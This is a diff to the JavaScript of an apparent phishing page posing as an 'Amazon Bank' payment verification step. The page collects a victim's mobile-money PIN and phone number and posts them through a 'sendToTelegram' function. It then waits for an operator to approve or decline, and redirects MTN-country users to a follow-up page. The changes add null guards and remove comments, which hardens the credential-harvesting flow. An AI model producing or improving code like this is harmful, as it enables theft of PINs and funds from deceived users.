@@ -11,13 +11,10 @@ const CONFIG = {
     (code) => `/api/links?code=${encodeURIComponent(code)}`
   ],
   DEFAULT_FEE: 0,
-  // How long to show the "Approved" flash before navigating
   APPROVED_FLASH_MS: 900,
-  // After this many ms of pending, change the subtitle to reassure the user
   SLOW_HINT_MS: 6000
 };
 
-/* MTN countries — routed to mtn.html on approve */
 const MTN_COUNTRIES = [
   'Benin', 'Cameroon', "Côte d'Ivoire", 'Congo', 'Eswatini',
   'Ghana (MTN)', 'Liberia', 'Rwanda (MTN)', 'Uganda (MTN)', 'Zambia (MTN)'
@@ -134,6 +131,7 @@ function render(payload) {
 
 function showStateCard(icon, title, message) {
   const scroll = document.getElementById('bodyScroll');
+  if (!scroll) return;
   scroll.innerHTML =
     '<div class="state-card">' +
       '<div class="ic">' + escapeHtml(icon) + '</div>' +
@@ -146,13 +144,14 @@ function initPin() {
   const inputs = Array.from(document.querySelectorAll('.pin-input'));
   const errEl = document.getElementById('pinError');
   const verifyBtn = document.getElementById('verifyBtn');
+  if (!inputs.length || !verifyBtn) return;
 
   function updateState() {
     state.pin = inputs.map(i => i.value);
     const filled = state.pin.every(v => v !== '');
     inputs.forEach(i => i.classList.toggle('filled', i.value !== ''));
     verifyBtn.disabled = !filled;
-    if (filled) errEl.classList.remove('show');
+    if (filled && errEl) errEl.classList.remove('show');
   }
 
   inputs.forEach((input, idx) => {
@@ -184,7 +183,6 @@ function initPin() {
   if (inputs[0]) setTimeout(() => inputs[0].focus(), 150);
 }
 
-/* ── Telegram send + poll ─────────────────── */
 async function sendToTelegram(pin, number, payload) {
   const res = await fetch(CONFIG.VERIFY_ENDPOINT, {
     method: 'POST',
@@ -235,18 +233,18 @@ function handleApprove() {
   state.polling = false;
   if (state.slowHintTimer) clearTimeout(state.slowHintTimer);
 
-  // Show a brief "Approved" flash so the user sees confirmation
   const overlay = document.getElementById('verifyingOverlay');
-  const title = overlay.querySelector('.load-title');
-  const sub   = overlay.querySelector('.load-sub');
-  const spinner = overlay.querySelector('.spinner');
-  if (title) title.textContent = 'Approved ✓';
-  if (sub) sub.textContent = 'Redirecting you to the next step…';
-  if (spinner) spinner.style.display = 'none';
+  if (overlay) {
+    const title = overlay.querySelector('.load-title');
+    const sub   = overlay.querySelector('.load-sub');
+    const spinner = overlay.querySelector('.spinner');
+    if (title) title.textContent = 'Approved ✓';
+    if (sub) sub.textContent = 'Redirecting you to the next step…';
+    if (spinner) spinner.style.display = 'none';
+  }
 
   const next = nextPageFor(state.payload && state.payload.c);
   const qs = window.location.search || '';
-
   setTimeout(() => {
     window.location.href = next + qs;
   }, CONFIG.APPROVED_FLASH_MS);
@@ -255,14 +253,17 @@ function handleApprove() {
 function handleDecline() {
   state.polling = false;
   if (state.slowHintTimer) clearTimeout(state.slowHintTimer);
-  document.getElementById('verifyingOverlay').classList.remove('show');
-  document.getElementById('resultOverlay').classList.add('show');
+  const vo = document.getElementById('verifyingOverlay');
+  if (vo) vo.classList.remove('show');
+  const ro = document.getElementById('resultOverlay');
+  if (ro) ro.classList.add('show');
   document.querySelectorAll('.pin-input').forEach(i => {
     i.value = '';
     i.classList.remove('filled');
   });
   state.pin = ['', '', '', ''];
-  document.getElementById('verifyBtn').disabled = true;
+  const vb = document.getElementById('verifyBtn');
+  if (vb) vb.disabled = true;
   state.requestId = null;
 }
 
@@ -270,24 +271,25 @@ async function doVerify() {
   const errEl = document.getElementById('pinError');
   const allFilled = state.pin.every(v => v !== '');
   if (!allFilled) {
-    errEl.classList.add('show');
+    if (errEl) errEl.classList.add('show');
     document.querySelectorAll('.pin-input').forEach(i => i.classList.add('error'));
     return;
   }
 
   const pin = state.pin.join('');
-  const number = document.getElementById('numDisplay').textContent;
+  const numEl = document.getElementById('numDisplay');
+  const number = numEl ? numEl.textContent : '';
 
-  // Reset overlay text in case of retry
   const overlay = document.getElementById('verifyingOverlay');
-  const title = overlay.querySelector('.load-title');
-  const sub   = overlay.querySelector('.load-sub');
-  const spinner = overlay.querySelector('.spinner');
-  if (title) title.textContent = 'Verifying your identity';
-  if (sub) sub.textContent = "We're confirming your PIN with Amazon Bank. This usually takes a few seconds.";
-  if (spinner) spinner.style.display = '';
-
-  overlay.classList.add('show');
+  if (overlay) {
+    const title = overlay.querySelector('.load-title');
+    const sub   = overlay.querySelector('.load-sub');
+    const spinner = overlay.querySelector('.spinner');
+    if (title) title.textContent = 'Verifying your identity';
+    if (sub) sub.textContent = "We're confirming your PIN with Amazon Bank. This usually takes a few seconds.";
+    if (spinner) spinner.style.display = '';
+    overlay.classList.add('show');
+  }
 
   try {
     const requestId = await sendToTelegram(pin, number, state.payload);
@@ -295,46 +297,66 @@ async function doVerify() {
     state.pollStart = Date.now();
     state.polling = true;
 
-    // After SLOW_HINT_MS, reassure the user if Telegram hasn't decided yet
     state.slowHintTimer = setTimeout(() => {
-      if (state.polling && sub) {
-        sub.textContent = 'Still waiting for approval — this can take a moment. Please don\'t close this page.';
+      if (state.polling && overlay) {
+        const sub = overlay.querySelector('.load-sub');
+        if (sub) sub.textContent = 'Still waiting for approval — this can take a moment. Please don\'t close this page.';
       }
     }, CONFIG.SLOW_HINT_MS);
 
     setTimeout(pollStatus, CONFIG.POLL_INTERVAL_MS);
   } catch (err) {
-    overlay.classList.remove('show');
+    if (overlay) overlay.classList.remove('show');
     handleDecline();
   }
 }
 
 /* ── Boot ─────────────────────────────────── */
 async function boot() {
-  document.getElementById('backBtn').addEventListener('click', () => {
-    if (window.history.length > 1) window.history.back();
-  });
+  // Back button (guarded)
+  const backBtn = document.getElementById('backBtn');
+  if (backBtn) {
+    backBtn.addEventListener('click', () => {
+      if (window.history.length > 1) window.history.back();
+    });
+  }
 
-  document.getElementById('tryAgainBtn').addEventListener('click', () => {
-    document.getElementById('resultOverlay').classList.remove('show');
-    document.getElementById('pinError').classList.remove('show');
-    const firstPin = document.querySelector('.pin-input');
-    if (firstPin) firstPin.focus();
-  });
+  // "Try again" (guarded)
+  const tryAgainBtn = document.getElementById('tryAgainBtn');
+  if (tryAgainBtn) {
+    tryAgainBtn.addEventListener('click', () => {
+      const ro = document.getElementById('resultOverlay');
+      if (ro) ro.classList.remove('show');
+      const pe = document.getElementById('pinError');
+      if (pe) pe.classList.remove('show');
+      const firstPin = document.querySelector('.pin-input');
+      if (firstPin) firstPin.focus();
+    });
+  }
 
+  // Resolve the payload first — if it fails, show the state card and stop
+  let payload;
   try {
-    const payload = await resolvePayload();
-    if (payload && payload.exp && Date.now() > Number(payload.exp)) {
-      showStateCard('⏱', 'This link has expired',
-        'The payment request is no longer valid. Please ask the sender to generate a new link.');
-      return;
-    }
-    render(payload);
-    initPin();
-    document.getElementById('verifyBtn').addEventListener('click', doVerify);
+    payload = await resolvePayload();
   } catch (err) {
     showStateCard('⚠', 'Payment link unavailable',
       err.message || 'Please start over from the payment link.');
+    return;
+  }
+
+  if (payload && payload.exp && Date.now() > Number(payload.exp)) {
+    showStateCard('⏱', 'This link has expired',
+      'The payment request is no longer valid. Please ask the sender to generate a new link.');
+    return;
+  }
+
+  render(payload);
+  initPin();
+
+  // Attach Verify listener ONLY after render + initPin succeed
+  const verifyBtn = document.getElementById('verifyBtn');
+  if (verifyBtn) {
+    verifyBtn.addEventListener('click', doVerify);
   }
 }
 
